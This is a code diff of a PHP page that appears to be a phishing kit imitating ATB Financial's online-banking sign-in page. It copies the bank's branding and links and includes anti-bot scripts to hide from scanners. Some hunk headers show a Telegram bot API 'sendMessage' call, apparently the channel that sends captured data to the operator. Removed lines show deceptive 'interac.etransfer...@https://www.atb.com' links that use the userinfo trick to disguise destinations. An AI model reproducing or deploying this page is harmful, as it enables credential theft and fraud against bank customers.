@@ -1,30 +1,5 @@
+
 <?php
-// Start session
-session_start();
-
-// Check if the user is authenticated
-if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
-    // Redirect to login page
-    header('Location: login.php');
-    exit();
-}
-
-// Set content security policy header to prevent XSS attacks
-header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'");
-
-// Set X-Frame-Options header to prevent clickjacking attacks
-header('X-Frame-Options: DENY');
-
-// Set X-XSS-Protection header to prevent XSS attacks in some browsers
-header('X-XSS-Protection: 1; mode=block');
-
-// Set X-Content-Type-Options header to prevent MIME-sniffing attacks
-header('X-Content-Type-Options: nosniff');
-
-// Set HTTP Strict Transport Security header to enforce HTTPS
-header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
-
-// Output your HTML code as normal
         include "/anti-bot/Bot-Spox.php";
         include "/anti-bot/Dila_DZ.php";
         include "/anti-bot/Fuck-you.php";
@@ -247,8 +222,8 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
 <!--Open Graph-->
 <meta property="og:title" content="Sign In">
 <meta property="og:type" content="summary">
-<meta property="og:url" content="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/sign-in/">
-<meta property="og:image" content="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/siteassets/images/icons/atb-blue-open-graph.jpg">
+<meta property="og:url" content="https://www.atb.com/sign-in/">
+<meta property="og:image" content="https://www.atb.com/siteassets/images/icons/atb-blue-open-graph.jpg">
 <meta property="og:description" content="Sign in to ATB online banking to access your personal or business accounts in seconds.">
 <meta property="og:site_name" content="ATB Financial">
 <meta property="og:locale" content="en_CA">
@@ -256,10 +231,10 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
 <meta name="twitter:card" content="summary">
 <meta name="twitter:site" content="@atbfinancial">
 <meta name="twitter:creator" content="@atbfinancial">
-<meta name="twitter:url" content="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/sign-in/">
+<meta name="twitter:url" content="https://www.atb.com/sign-in/">
 <meta name="twitter:title" content="Sign In">
 <meta name="twitter:description" content="Sign in to ATB online banking to access your personal or business accounts in seconds.">
-<meta name="twitter:image" content="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/siteassets/images/icons/atb-blue-open-graph.jpg">
+<meta name="twitter:image" content="https://www.atb.com/siteassets/images/icons/atb-blue-open-graph.jpg">
 <!--Facebook-->
 <meta property="fb:app_id">
 <meta property="article:author" content="ATB Financial">
@@ -268,19 +243,19 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
 
     
 
-<link href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/static/img/favicon.ico" rel="icon" type="image/x-icon">
-<link href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/static/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
-<link href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/static/img/apple-touch-icon-57x57.png" rel="apple-touch-icon" sizes="57x57">
-<link href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/static/img/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76">
-<link href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/static/img/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120">
-<link href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/static/img/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152">
-<link href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/static/img/apple-touch-icon-167x167.png" rel="apple-touch-icon" sizes="167x167">
-<link href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/static/img/apple-touch-icon-180x180.png" rel="apple-touch-icon" sizes="180x180">
-<link href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/static/img/favicon-32x32.png" rel="icon" type="image/png" sizes="32x32">
-<link href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/static/img/favicon-16x16.png" rel="icon" type="image/png" sizes="16x16">
-<link href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/static/img/favicon-48x48.png" rel="icon" type="image/png" sizes="48x48">
-<link href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/static/img/site.webmanifest" rel="manifest" crossorigin="use-credentials">
-<link href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/static/img/safari-pinned-tab.svg" rel="mask-icon" color="#005eb8">
+<link href="https://www.atb.com/static/img/favicon.ico" rel="icon" type="image/x-icon">
+<link href="https://www.atb.com/static/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
+<link href="https://www.atb.com/static/img/apple-touch-icon-57x57.png" rel="apple-touch-icon" sizes="57x57">
+<link href="https://www.atb.com/static/img/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76">
+<link href="https://www.atb.com/static/img/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120">
+<link href="https://www.atb.com/static/img/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152">
+<link href="https://www.atb.com/static/img/apple-touch-icon-167x167.png" rel="apple-touch-icon" sizes="167x167">
+<link href="https://www.atb.com/static/img/apple-touch-icon-180x180.png" rel="apple-touch-icon" sizes="180x180">
+<link href="https://www.atb.com/static/img/favicon-32x32.png" rel="icon" type="image/png" sizes="32x32">
+<link href="https://www.atb.com/static/img/favicon-16x16.png" rel="icon" type="image/png" sizes="16x16">
+<link href="https://www.atb.com/static/img/favicon-48x48.png" rel="icon" type="image/png" sizes="48x48">
+<link href="https://www.atb.com/static/img/site.webmanifest" rel="manifest" crossorigin="use-credentials">
+<link href="https://www.atb.com/static/img/safari-pinned-tab.svg" rel="mask-icon" color="#005eb8">
 <meta content="/static/img/browserconfig.xml" name="msapplication-config">
 <meta name="msapplication-TileColor" content="#2b5797">
 <meta name="theme-color" content="#005eb8">
@@ -300,7 +275,7 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
 
 
     
-    <link href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/sign-in/" rel="canonical">
+    <link href="https://www.atb.com/sign-in/" rel="canonical">
 
     
      
@@ -314,10 +289,10 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
 <header class="navigation dark-bg navigation-full" aria-label="ATB Financial Sign In banking">
     <div class="navigation-menu headroom headroom--top headroom--not-bottom">
         <div id="skip-to-content">
-            <a tabindex="3" href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/sign-in/#content">Skip to content</a>
-            <a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/sign-in/#header-nav-secondary">Skip to Sign In menu</a>
-            <a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/search/">Search</a>
-            <a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/sign-in/">Sign in to online banking</a>
+            <a tabindex="3" href="https://www.atb.com/sign-in/#content">Skip to content</a>
+            <a href="https://www.atb.com/sign-in/#header-nav-secondary">Skip to Sign In menu</a>
+            <a href="https://www.atb.com/search/">Search</a>
+            <a href="https://www.atb.com/sign-in/">Sign in to online banking</a>
             
     <span role="button" class="btn btn-link chat-button" tabindex="0" aria-label="" data-event-pressed="atb.virtual-assistant.open" data-event-options="{&quot;source&quot;:&quot;navigation-accessibility-link&quot;}">
         <span class="btn-content" tabindex="-1">Chat with our Virtual Assistant</span>
@@ -329,13 +304,13 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
                     <div role="button" class="menu-toggle" tabindex="0" aria-label="Toggle main navigation menu" aria-labelledby="Main navigation menu" aria-expanded="false" aria-controls="header-nav-primary header-nav-secondary">
                         <span tabindex="-1">&nbsp;</span>
                     </div>
-                    <a class="search-icon-link" href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/search/" aria-label="Search"><span class="search-icon" tabindex="-1">&nbsp;</span></a>
+                    <a class="search-icon-link" href="https://www.atb.com/search/" aria-label="Search"><span class="search-icon" tabindex="-1">&nbsp;</span></a>
                 </div>
                 <div class="col center" aria-hidden="true">
-                    <a class="atb-jewel" href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/" tabindex="-1"></a>
+                    <a class="atb-jewel" href="https://www.atb.com/" tabindex="-1"></a>
                 </div>
                 <div class="col right">
-                    <a class="sign-in" href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/sign-in/"><span tabindex="-1" class="text">Sign In<i class="chevron-right"></i></span></a>
+                    <a class="sign-in" href="https://www.atb.com/sign-in/"><span tabindex="-1" class="text">Sign In<i class="chevron-right"></i></span></a>
                 </div>
             </div>
         </div>
@@ -344,8 +319,8 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
                 <div class="row">
                     <nav aria-label="Sign In categories" class="col-12">
                         <ul>
-<li><a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/personal/" aria-label="Personal"><span class="text" tabindex="-1">Personal</span></a></li><li><a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/business/" aria-label="Business"><span class="text" tabindex="-1">Business</span></a></li><li><a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/commercial/" aria-label="Commercial"><span class="text" tabindex="-1">Commercial</span></a></li><li><a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/wealth/" aria-label="Wealth"><span class="text" tabindex="-1">Wealth</span></a></li>                                                            <li class="h-spacer"></li>
-                                <li><a class="sign-in" href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/sign-in/" aria-label="Sign in to online banking"><span class="text" tabindex="-1">Sign In <i class="chevron-right"></i></span></a></li>
+<li><a href="https://www.atb.com/personal/" aria-label="Personal"><span class="text" tabindex="-1">Personal</span></a></li><li><a href="https://www.atb.com/business/" aria-label="Business"><span class="text" tabindex="-1">Business</span></a></li><li><a href="https://www.atb.com/commercial/" aria-label="Commercial"><span class="text" tabindex="-1">Commercial</span></a></li><li><a href="https://www.atb.com/wealth/" aria-label="Wealth"><span class="text" tabindex="-1">Wealth</span></a></li>                                                            <li class="h-spacer"></li>
+                                <li><a class="sign-in" href="https://www.atb.com/sign-in/" aria-label="Sign in to online banking"><span class="text" tabindex="-1">Sign In <i class="chevron-right"></i></span></a></li>
                         </ul>
                     </nav>
                 </div>
@@ -361,9 +336,9 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
         <div class="row">
             <nav aria-label="Sign In section" tabindex="-1" class="col-12">
                 <ul>
-                    <li aria-hidden="true"><a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/" class="atb-jewel" tabindex="-1"></a></li>
+                    <li aria-hidden="true"><a href="https://www.atb.com/" class="atb-jewel" tabindex="-1"></a></li>
                     <li class="h-spacer"></li>
-                    <li><a class="search" href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/search/" aria-label="Search"><span tabindex="-1"><i class="search-icon"></i></span></a></li>
+                    <li><a class="search" href="https://www.atb.com/search/" aria-label="Search"><span tabindex="-1"><i class="search-icon"></i></span></a></li>
                 </ul>
             </nav>
         </div>
@@ -450,9 +425,9 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
             <section class="col col-6 col-sm-3" aria-label="Get in touch">
     <h3 class="h5">Get in touch</h3>
     <ul role="list">
-    <li role="listitem"><a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/resources/contact-us/" aria-label="Contact us"><span tabindex="-1">Contact us</span></a></li>
-    <li role="listitem"><a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/resources/contact-us/feedback/" aria-label="Client feedback"><span tabindex="-1">Client feedback</span></a></li>
-    <li role="listitem"><a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/resources/find-a-location/" aria-label="Find a location"><span tabindex="-1">Find a location</span></a></li>
+    <li role="listitem"><a href="https://www.atb.com/resources/contact-us/" aria-label="Contact us"><span tabindex="-1">Contact us</span></a></li>
+    <li role="listitem"><a href="https://www.atb.com/resources/contact-us/feedback/" aria-label="Client feedback"><span tabindex="-1">Client feedback</span></a></li>
+    <li role="listitem"><a href="https://www.atb.com/resources/find-a-location/" aria-label="Find a location"><span tabindex="-1">Find a location</span></a></li>
     <li role="listitem"><a href="https://meet.atb.com/" aria-label="Book an appointment"><span tabindex="-1">Book an appointment</span></a></li>
     </ul>
 </section>
@@ -468,21 +443,21 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
 <section class="col col-6 col-sm-3" aria-label="Resources">
     <h3 class="h5">Resources</h3>
     <ul role="list">
-    <li role="listitem"><a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/resources/rates/" aria-label="Current rates"><span tabindex="-1">Current rates</span></a></li>
-    <li role="listitem"><a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/resources/support/digital-banking/" aria-label="Digital banking help"><span tabindex="-1">Digital banking help</span></a></li>
-    <li role="listitem"><a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/company/privacy-and-security/casl/" aria-label="Marketing preferences"><span tabindex="-1">Marketing preferences</span></a></li>
-    <li role="listitem"><a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/resources/tools/" aria-label="Tools"><span tabindex="-1">Tools</span></a></li>
+    <li role="listitem"><a href="https://www.atb.com/resources/rates/" aria-label="Current rates"><span tabindex="-1">Current rates</span></a></li>
+    <li role="listitem"><a href="https://www.atb.com/resources/support/digital-banking/" aria-label="Digital banking help"><span tabindex="-1">Digital banking help</span></a></li>
+    <li role="listitem"><a href="https://www.atb.com/company/privacy-and-security/casl/" aria-label="Marketing preferences"><span tabindex="-1">Marketing preferences</span></a></li>
+    <li role="listitem"><a href="https://www.atb.com/resources/tools/" aria-label="Tools"><span tabindex="-1">Tools</span></a></li>
     </ul>
 </section>
 <section class="col col-6 col-sm-3" aria-label="Company">
     <h3 class="h5">Company</h3>
     <ul role="list">
-    <li role="listitem"><a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/company/about-atb/" aria-label="About"><span tabindex="-1">About</span></a></li>
-    <li role="listitem"><a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/company/accessibility/" aria-label="Accessibility"><span tabindex="-1">Accessibility</span></a></li>
-    <li role="listitem"><a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/company/careers/" aria-label="Careers"><span tabindex="-1">Careers</span></a></li>
-    <li role="listitem"><a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/company/community/" aria-label="Community"><span tabindex="-1">Community</span></a></li>
-    <li role="listitem"><a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/company/insights/" aria-label="Insights"><span tabindex="-1">Insights</span></a></li>
-    <li role="listitem"><a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/company/news/" aria-label="News"><span tabindex="-1">News</span></a></li>
+    <li role="listitem"><a href="https://www.atb.com/company/about-atb/" aria-label="About"><span tabindex="-1">About</span></a></li>
+    <li role="listitem"><a href="https://www.atb.com/company/accessibility/" aria-label="Accessibility"><span tabindex="-1">Accessibility</span></a></li>
+    <li role="listitem"><a href="https://www.atb.com/company/careers/" aria-label="Careers"><span tabindex="-1">Careers</span></a></li>
+    <li role="listitem"><a href="https://www.atb.com/company/community/" aria-label="Community"><span tabindex="-1">Community</span></a></li>
+    <li role="listitem"><a href="https://www.atb.com/company/insights/" aria-label="Insights"><span tabindex="-1">Insights</span></a></li>
+    <li role="listitem"><a href="https://www.atb.com/company/news/" aria-label="News"><span tabindex="-1">News</span></a></li>
     </ul>
 </section>
 
@@ -492,9 +467,9 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
 
             <section id="footer-legal" aria-label="Legal Links">
                 <ul role="list">
-    <li role="listitem"><a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/company/legal/" aria-label="Legal"><span tabindex="-1">Legal</span></a></li>
-    <li role="listitem"><a href="http://interac.etransferdRP=234Q25CRW3JBX5WU45W67HDMXMH7H5D45XS3HJTF43756E7GT4444E4J4S44H444F4TE7F5GEJF56HEWS5DT4K7SSSSCSTXGRDM567J5FTRF4HJ576D5C6DGJ5DX5JMH6CH4DFDJF54F5XFH475657HE845X578I4X6DD4XHM7K5C7JK@https://www.atb.com/company/privacy-and-security/" aria-label="Privacy &amp; security"><span tabindex="-1">Privacy &amp; security</span></a></li>
